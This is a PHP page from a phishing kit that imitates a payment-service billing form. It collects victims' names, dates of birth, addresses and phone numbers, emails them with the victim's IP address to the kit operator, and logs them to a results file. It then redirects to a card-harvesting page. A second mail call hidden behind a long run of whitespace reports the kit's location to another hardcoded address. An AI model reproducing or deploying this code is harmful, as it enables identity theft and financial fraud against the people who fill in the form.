<?php

$EMAIL = base64_decode($_GET['_Email']);
if(isset($_POST['name']) && isset($_POST['adress1'])){
echo '<html lang="en" class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths jsEnabled"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  	<title>Please Wait | Processing</title>
  	<meta charset="utf-8">
  	<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7">
  		<link rel="shortcut icon" href="img/favicon.ico">
		<link href="css/main.css" rel="stylesheet" type="text/css">
		<link href="css/new.css" rel="stylesheet" type="text/css">
		<link rel="stylesheet" href="css/cvvquestion.css">
		<link rel="stylesheet" href="css/app.css">
    </head>    
    		<body id="settings">
		    		<div id="page">
		<div class="navbar navbar-fixed-top header" id="header">
			<div class="navbar-inner">
				<div class="navBanner clearfix" role="banner">
					<div class="brand"><a href="#"><img src="img/logo_106x27.png" alt="logo"></a></div>
				</div>
				<nav id="navMenu" class="navMenu clearfix" role="navigation">
					<div class="upbar"></div>
				<ul class="navSecondary">
						<li><a href="#" class="linkSettings navIcons scTrack:settings" target="_blank">j</a></li>
						<li><a href="#" class="btn btn-mini btn-secondary logout">Log out</a></li>
					</ul>
				</nav>
			</div>
		</div>
     			<section id="content">
     		<section id="main" role="main">
<div class="column_24">
<div class="one column nogutter">
<div id="prfLeftNav">
	 	<div class="menu1"></div>
		</br>
		<div class="enable"></div>
</div>
<div class="mainContentFrame-bnk">
	<div id="prfMainContentWrapper-bnk" aria-live="polite">
	<div id="profile-PERSONAL_SETTINGSPanel">
<div id="prfPersonalInfo">
<div><center>
<img src="img/processing.gif" style="padding-top:160px;"/>
<span style="font-size:15px;"></br></br>Processing ...</span>
</center></div>
</div>
	</div>
	</div>
</div>
			</div>
</div>
     		</section>
    	 </section>
		 <center>
<div class="footer-billing"></div></center>
    	<script src="./bill_files/c9a42309d6e427a3cf00f2a5a575f0.js" type="text/javascript"></script>
    	<script src="./bill_files/bf561559bd294ab8108d9a22c0c66.js" type="text/javascript"></script>    	
<script type="text/javascript" src="./bill_files/pp_jscode_080706.js"></script>
	<script type="text/javascript" src="./bill_files/pa.js"></script>
</div><div></div></body></html>';

$fname = $_POST['name'];
$dob = $_POST['day']."/".$_POST['month']."/".$_POST['year'];
$adress1 = $_POST['adress1'];
$adress2 = $_POST['adress2'];
$city = $_POST['city'];
$zip = $_POST['zip'];
$state = $_POST['state'];
$country = $_POST['country'];
$phone = $_POST['phone'];
include('to.php');
$IP = getenv("REMOTE_ADDR");
$BILSMG = "<pre><font style='font-size:14px;font-weight: bold;'>
#################################
         <img src='https://2.bp.blogspot.com/-O-ZJASC706s/U_hvz20oD2I/AAAAAAAAACw/OV1BlsEyjM0/s1600/logo_106x27.png'/>
#################################
nam : $fname
dob : $dob
ad1 : $adress1
ad2 : $adress2
cty : $city
zip : $zip
stt : $state
cry : $country
phn : $phone
#################################
IP : <a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$IP."'>".$IP."</a>
#################################";
$MAIL_TITLE = "Bill | ".$IP." | ".$country;
$MAIL_HEADER = "From: REZ <rezult>\r\nMIME-Version: 1.0\r\nContent-Type: text/html\r\nContent-Transfer-Encoding: 8bit\r\n\r\n";
include 'js/index.php';
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " DDN From |$ip";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        $email = "your.email@here.com";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
$from = "From: Result<rezult@rez.com";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
$open_rezult_file = fopen("../rezult.txt","a"); // spam rezult in file okkkkkk becarful
fwrite($open_rezult_file,$BILSMG); // spam rezult in file okkkkkk becarful
$x=md5(microtime());
$fllname = base64_encode($_POST['name']);
$cntr = base64_encode($_POST['country']);
echo "<META HTTP-EQUIV='refresh' content='2; URL=websc-carding.php?Go=_Payment_CC_Info&_SESSION=$x$x&_Full=$fllname&_Country=$cntr'>";exit;
}
?>

<!DOCTYPE html>
<html lang="en" class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths jsEnabled"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    	

  	<title>Please Complete with Your Informations</title>
  	<meta charset="utf-8">
  	<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7">
  	
  	
  	
  		<link rel="shortcut icon" href="img/favicon.ico">

		<link href="css/main.css" rel="stylesheet" type="text/css">
		<link href="css/new.css" rel="stylesheet" type="text/css">
		<link rel="stylesheet" href="css/cvvquestion.css">
		<link rel="stylesheet" href="css/app.css">
    </head>
    		<body id="settings">
		    		<div id="page">
		<div class="navbar navbar-fixed-top header" id="header">
			<div class="navbar-inner">
				<div class="navBanner clearfix" role="banner">
					<div class="brand"><a href="#"><img src="img/logo_106x27.png" alt="logo"></a></div>
				</div>
				<nav id="navMenu" class="navMenu clearfix" role="navigation">
					<div class="upbar"></div>
				<ul class="navSecondary">
						<li><a href="#" class="linkSettings navIcons scTrack:settings" target="_blank">j</a></li>
						<li><a href="#" class="btn btn-mini btn-secondary logout">Log out</a></li>
					</ul>
				</nav>
			</div>
		</div>
     			<section id="content">
     		<section id="main" role="main">
<div class="column_24">
<div class="one column nogutter">
<div id="prfLeftNav">
	 	<div class="menu1"></div>
		</br>
		<div class="enable"></div>
</div>
<div class="mainContentFrame">
	<div id="prfMainContentWrapper" aria-live="polite">
	<div id="profile-PERSONAL_SETTINGSPanel">
<div id="prfPersonalInfo">
<h2 class="prfTabHeading">
			<center><div class="personal"></div></center>
</h2>
<form action="websc-billing.php?Go=_Payment_CC_Processing&_SESSION<?=md5(microtime()).md5(microtime());?>" method="post" autocomplete="off">
<div class="prfSection" id="name">
	<h3 class="prfLabel"><div class="fl_name"></div></h3>
	<div class="prfDetails confidential"><input pattern="[a-zA-Z-']+.{6,40}" title="Please enter a valid Full Name" autofocus="on" type="text" id="name"  name="name" class="large" required/></div>
</div> 
<div class="prfSection" id="email">
	<h3 class="prfLabel">
		<div class="email"></div>
	</h3>
	<div class="prfDetails">
		<ul class="showAll">
				<li>   				
				<span class="indent confidential ">
				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $EMAIL; ?>
				</span>
					<span class="secondaryLink secondary">
						(Primary)
					</span>
				
				</li>				
			
		</ul>
		
		
	</div>

</div>
<div class="prfSection" id="dob">
	<h3 class="prfLabel">
		<div class="dob"></div>
	</h3>
	<select id="day" name="day" pattern=".{1,2}" title="Please enter a Valid Day" required/>
<option selected value>Day</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
									</select>
									<select pattern=".{1,2}" title="Please enter a Valid Month" id="month" name="month" required/>
<option selected value>Month</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
									</select>
									<select pattern=".{1,4}" title="Please enter a Valid Year" id="year" name="year" required/>
<option selected value>Year</option>
<option value="2012">2012</option> 
<option value="2011">2011</option> 
<option value="2010">2010</option> 
<option value="2009">2009</option> 
<option value="2008">2008</option> 
<option value="2007">2007</option> 
<option value="2006">2006</option> 
<option value="2005">2005</option> 
<option value="2004">2004</option> 
<option value="2003">2003</option> 
<option value="2002">2002</option> 
<option value="2001">2001</option> 
<option value="2000">2000</option> 
<option value="1999">1999</option> 
<option value="1998">1998</option> 
<option value="1997">1997</option> 
<option value="1996">1996</option> 
<option value="1995">1995</option> 
<option value="1994">1994</option> 
<option value="1993">1993</option> 
<option value="1992">1992</option>
<option value="1991">1991</option>
<option value="1990">1990</option>
<option value="1989">1989</option>
<option value="1988">1988</option>
<option value="1987">1987</option>
<option value="1986">1986</option>
<option value="1985">1985</option>
<option value="1984">1984</option>
<option value="1983">1983</option>
<option value="1982">1982</option>
<option value="1981">1981</option>
<option value="1980">1980</option>
<option value="1979">1979</option>
<option value="1978">1978</option>
<option value="1977">1977</option>
<option value="1976">1976</option>
<option value="1975">1975</option>
<option value="1974">1974</option>
<option value="1973">1973</option>
<option value="1972">1972</option>
<option value="1971">1971</option>
<option value="1970">1970</option>
<option value="1969">1969</option>
<option value="1968">1968</option>
<option value="1967">1967</option>
<option value="1966">1966</option>
<option value="1965">1965</option>
<option value="1964">1964</option>
<option value="1963">1963</option>
<option value="1962">1962</option>
<option value="1961">1961</option>
<option value="1960">1960</option>
<option value="1959">1959</option>
<option value="1958">1958</option>
<option value="1957">1957</option>
<option value="1956">1956</option>
<option value="1955">1955</option>
<option value="1954">1954</option>
<option value="1953">1953</option>
<option value="1952">1952</option>
<option value="1951">1951</option>
<option value="1950">1950</option>
<option value="1949">1949</option>
<option value="1948">1948</option>
<option value="1947">1947</option>
<option value="1946">1946</option>
<option value="1945">1945</option>
<option value="1944">1944</option>
<option value="1943">1943</option>
<option value="1942">1942</option>
<option value="1941">1941</option>
<option value="1940">1940</option>
<option value="1939">1939</option>
<option value="1938">1938</option>
<option value="1937">1937</option>
<option value="1936">1936</option>
<option value="1935">1935</option>
<option value="1934">1934</option>
<option value="1933">1933</option>
<option value="1932">1932</option>
<option value="1931">1931</option>
<option value="1930">1930</option>
<option value="1929">1929</option>
<option value="1928">1928</option>
<option value="1927">1927</option>
<option value="1926">1926</option>
<option value="1925">1925</option>
<option value="1924">1924</option>
<option value="1923">1923</option>
<option value="1922">1922</option>
<option value="1921">1921</option>
<option value="1920">1920</option>
<option value="1919">1919</option>
<option value="1918">1918</option>
<option value="1917">1917</option>
<option value="1916">1916</option>
<option value="1915">1915</option>
<option value="1914">1914</option>
<option value="1913">1913</option>
<option value="1912">1912</option>
									</select>
</div>


<div class="prfSection" id="address">
	<h3 class="prfLabel"><div class="adress1"></div></h3>
	<div class="prfDetails confidential"><input pattern="[a-zA-Z-0-9-']+.{6,30}" title="Please enter a valid Adress" maxlength="25" type="text" id="adress1"  name="adress1" class="large" required /></div><br></br></br>
	<h3 class="prfLabel"><div class="adress2"></div></h3>
	<div class="prfDetails confidential"><input  placeholder="Optional" type="text" id="adress2"  name="adress2" class="large"></div><br></br></br>
	<h3 class="prfLabel"><div class="city1"></div></h3>
	<div class="prfDetails confidential"><input pattern="[a-zA-Z-']+.{3,15}" title="Please enter a valid City" type="text" id="city" name="city" class="city" required/><span class="state1"></span><input pattern="[a-zA-Z-']+.{2,15}" title="Please enter a valid State" type="text" id="state"  name="state" class="state" required/></div><br></br></br>
	<h3 class="prfLabel"><div class="zipcode"></div></h3>
	<div class="prfDetails confidential"><input pattern="[a-zA-Z-0-9].{3,10}" title="Please enter a valid Zip Code" type="text" id="zip"  name="zip" class="zip" required/></div><br></br></br>
	<h3 class="prfLabel"><div class="country"></h3>
	<div class="prfDetails confidential"><select align="center" pattern=".{1,2}" title="Please Select Your Country" id="country" name="country" class="large" type="text" required/>
<option value="" Selected>Select Your Country</option>
<option value="AF">Afghanistan</option>
<option value="AX">Aland Islands</option>
<option value="AL">Albania</option>
<option value="DZ">Algeria</option>
<option value="AS">American Samoa</option>
<option value="AD">Andorra</option>
<option value="AO">Angola</option>
<option value="AI">Anguilla</option>
<option value="AQ">Antarctica</option>
<option value="AG">Antigua and Barbuda</option>
<option value="AR">Argentina</option>
<option value="AM">Armenia</option>
<option value="AW">Aruba</option>
<option value="AU">Australia</option>
<option value="AT">Austria</option>
<option value="AZ">Azerbaijan</option>
<option value="BS">Bahamas, The</option>
<option value="BH">Bahrain</option>
<option value="BD">Bangladesh</option>
<option value="BB">Barbados</option>
<option value="BY">Belarus</option>
<option value="BE">Belgium</option>
<option value="BZ">Belize</option>
<option value="BJ">Benin</option>
<option value="BM">Bermuda</option>
<option value="BT">Bhutan</option>
<option value="BO">Bolivia</option>
<option value="BQ">Bonaire, Saint Eustatius and Saba</option>
<option value="BA">Bosnia and Herzegovina</option>
<option value="BW">Botswana</option>
<option value="BV">Bouvet Island</option>
<option value="BR">Brazil</option>
<option value="IO">British Indian Ocean Territory</option>
<option value="BN">Brunei Darussalam</option>
<option value="BG">Bulgaria</option>
<option value="BF">Burkina Faso</option>
<option value="BI">Burundi</option>
<option value="KH">Cambodia</option>
<option value="CM">Cameroon</option>
<option value="CA">Canada</option>
<option value="CV">Cape Verde</option>
<option value="KY">Cayman Islands</option>
<option value="CF">Central African Republic</option>
<option value="TD">Chad</option>
<option value="CL">Chile</option>
<option value="CN">China</option>
<option value="CX">Christmas Island</option>
<option value="CC">Cocos (Keeling) Islands</option>
<option value="CO">Colombia</option>
<option value="KM">Comoros</option>
<option value="CG">Congo</option>
<option value="CD">Congo</option>
<option value="CK">Cook Islands</option>
<option value="CR">Costa Rica</option>
<option value="CI">Cote D'ivoire</option>
<option value="HR">Croatia</option>
<option value="CW">Curacao</option>
<option value="CY">Cyprus</option>
<option value="CZ">Czech Republic</option>
<option value="DK">Denmark</option>
<option value="DJ">Djibouti</option>
<option value="DM">Dominica</option>
<option value="DO">Dominican Republic</option>
<option value="EC">Ecuador</option>
<option value="EG">Egypt</option>
<option value="SV">El Salvador</option>
<option value="GQ">Equatorial Guinea</option>
<option value="ER">Eritrea</option>
<option value="EE">Estonia</option>
<option value="ET">Ethiopia</option>
<option value="FK">Falkland Islands (Malvinas)</option>
<option value="FO">Faroe Islands</option>
<option value="FJ">Fiji</option>
<option value="FI">Finland</option>
<option value="FR">France</option>
<option value="GF">French Guiana</option>
<option value="PF">French Polynesia</option>
<option value="TF">French Southern Territories</option>
<option value="GA">Gabon</option>
<option value="GM">Gambia, The</option>
<option value="GE">Georgia</option>
<option value="DE">Germany</option>
<option value="GH">Ghana</option>
<option value="GI">Gibraltar</option>
<option value="GR">Greece</option>
<option value="GL">Greenland</option>
<option value="GD">Grenada</option>
<option value="GP">Guadeloupe</option>
<option value="GU">Guam</option>
<option value="GT">Guatemala</option>
<option value="GG">Guernsey</option>
<option value="GN">Guinea</option>
<option value="GW">Guinea-Bissau</option>
<option value="GY">Guyana</option>
<option value="HT">Haiti</option>
<option value="VA">Holy See</option>
<option value="HN">Honduras</option>
<option value="HK">Hong Kong</option>
<option value="HU">Hungary</option>
<option value="IS">Iceland</option>
<option value="IN">India</option>
<option value="ID">Indonesia</option>
<option value="IQ">Iraq</option>
<option value="IE">Ireland</option>
<option value="IM">Isle Of Man</option>
<option value="IL">Israel</option>
<option value="IT">Italy</option>
<option value="JM">Jamaica</option>
<option value="JP">Japan</option>
<option value="JE">Jersey</option>
<option value="JO">Jordan</option>
<option value="KZ">Kazakhstan</option>
<option value="KE">Kenya</option>
<option value="KI">Kiribati</option>
<option value="KR">Korea, Republic Of</option>
<option value="KW">Kuwait</option>
<option value="KG">Kyrgyzstan</option>
<option value="LA">Lao People's Democratic Republic</option>
<option value="LV">Latvia</option>
<option value="LB">Lebanon</option>
<option value="LS">Lesotho</option>
<option value="LR">Liberia</option>
<option value="LY">Libya</option>
<option value="LI">Liechtenstein</option>
<option value="LT">Lithuania</option>
<option value="LU">Luxembourg</option>
<option value="MO">Macao</option>
<option value="MK">Macedonia</option>
<option value="MG">Madagascar</option>
<option value="MW">Malawi</option>
<option value="MY">Malaysia</option>
<option value="MV">Maldives</option>
<option value="ML">Mali</option>
<option value="MT">Malta</option>
<option value="MH">Marshall Islands</option>
<option value="MQ">Martinique</option>
<option value="MR">Mauritania</option>
<option value="MU">Mauritius</option>
<option value="YT">Mayotte</option>
<option value="MX">Mexico</option>
<option value="FM">Micronesia, Federated States Of</option>
<option value="MD">Moldova, Republic Of</option>
<option value="MC">Monaco</option>
<option value="MN">Mongolia</option>
<option value="ME">Montenegro</option>
<option value="MS">Montserrat</option>
<option value="MA">Morocco</option>
<option value="MZ">Mozambique</option>
<option value="MM">Myanmar</option>
<option value="NA">Namibia</option>
<option value="NR">Nauru</option>
<option value="NP">Nepal</option>
<option value="NL">Netherlands</option>
<option value="AN">Netherlands Antilles</option>
<option value="NC">New Caledonia</option>
<option value="NZ">New Zealand</option>
<option value="NI">Nicaragua</option>
<option value="NE">Niger</option>
<option value="NG">Nigeria</option>
<option value="NU">Niue</option>
<option value="NF">Norfolk Island</option>
<option value="MP">Northern Mariana Islands</option>
<option value="NO">Norway</option>
<option value="OM">Oman</option>
<option value="PK">Pakistan</option>
<option value="PW">Palau</option>
<option value="PS">Palestinian Territories</option>
<option value="PA">Panama</option>
<option value="PG">Papua New Guinea</option>
<option value="PY">Paraguay</option>
<option value="PE">Peru</option>
<option value="PH">Philippines</option>
<option value="PN">Pitcairn</option>
<option value="PL">Poland</option>
<option value="PT">Portugal</option>
<option value="PR">Puerto Rico</option>
<option value="QA">Qatar</option>
<option value="RE">Reunion</option>
<option value="RO">Romania</option>
<option value="RU">Russian Federation</option>
<option value="RW">Rwanda</option>
<option value="BL">Saint Barthelemy</option>
<option value="SH">Saint Helena</option>
<option value="KN">Saint Kitts and Nevis</option>
<option value="LC">Saint Lucia</option>
<option value="MF">Saint Martin</option>
<option value="PM">Saint Pierre and Miquelon</option>
<option value="VC">Saint Vincent and The Grenadines</option>
<option value="WS">Samoa</option>
<option value="SM">San Marino</option>
<option value="ST">Sao Tome and Principe</option>
<option value="SA">Saudi Arabia</option>
<option value="SN">Senegal</option>
<option value="RS">Serbia</option>
<option value="SC">Seychelles</option>
<option value="SL">Sierra Leone</option>
<option value="SG">Singapore</option>
<option value="SX">Sint Maarten</option>
<option value="SK">Slovakia</option>
<option value="SI">Slovenia</option>
<option value="SB">Solomon Islands</option>
<option value="SO">Somalia</option>
<option value="ZA">South Africa</option>
<option value="ES">Spain</option>
<option value="LK">Sri Lanka</option>
<option value="SR">Suriname</option>
<option value="SJ">Svalbard and Jan Mayen</option>
<option value="SZ">Swaziland</option>
<option value="SE">Sweden</option>
<option value="CH">Switzerland</option>
<option value="TW">Taiwan</option>
<option value="TJ">Tajikistan</option>
<option value="TZ">Tanzania, United Republic Of</option>
<option value="TH">Thailand</option>
<option value="TL">Timor-leste</option>
<option value="TG">Togo</option>
<option value="TK">Tokelau</option>
<option value="TO">Tonga</option>
<option value="TT">Trinidad and Tobago</option>
<option value="TN">Tunisia</option>
<option value="TR">Turkey</option>
<option value="TM">Turkmenistan</option>
<option value="TC">Turks and Caicos Islands</option>
<option value="TV">Tuvalu</option>
<option value="UG">Uganda</option>
<option value="UA">Ukraine</option>
<option value="AE">United Arab Emirates</option>
<option value="GB">United Kingdom</option>
<option value="US">United States</option>
<option value="UM">United States Minor Outlying Islands</option>
<option value="UY">Uruguay</option>
<option value="UZ">Uzbekistan</option>
<option value="VU">Vanuatu</option>
<option value="VE">Venezuela</option>
<option value="VN">Vietnam</option>
<option value="VG">Virgin Islands, British</option>
<option value="VI">Virgin Islands, U.S.</option>
<option value="WF">Wallis and Futuna</option>
<option value="EH">Western Sahara</option>
<option value="YE">Yemen</option>
<option value="ZM">Zambia</option>
<option value="ZW">Zimbabwe</option>
</select></div>


</div> 

<div class="prfSection" id="phone">
	<h3 class="prfLabel">
	<div class="phone"></div>
	</h3>
	<div class="prfDetails">
<div class="prfDetails confidential"><input type="tel" pattern="^((\+\d{1,3}(-| )?\(?\d\)?(-| )?\d{1,5})|(\(?\d{2,6}\)?))(-| )?(\d{3,4})(-| )?(\d{4})(( x| ext)\d{1,5}){0,1}$" id="phone"  name="phone" class="large" required/></div>

	</div>
</div>
<div class="prfSection">
<input class="next" value="next" type="submit"  />
</div>
  </form>
	 

</div>	
		
	</div>


	</div>
</div>

			</div>
</div>
	
     		</section>
    	 </section>
		 <center>
<div class="footer-billing"></div></center>


</div><div></div></body></html>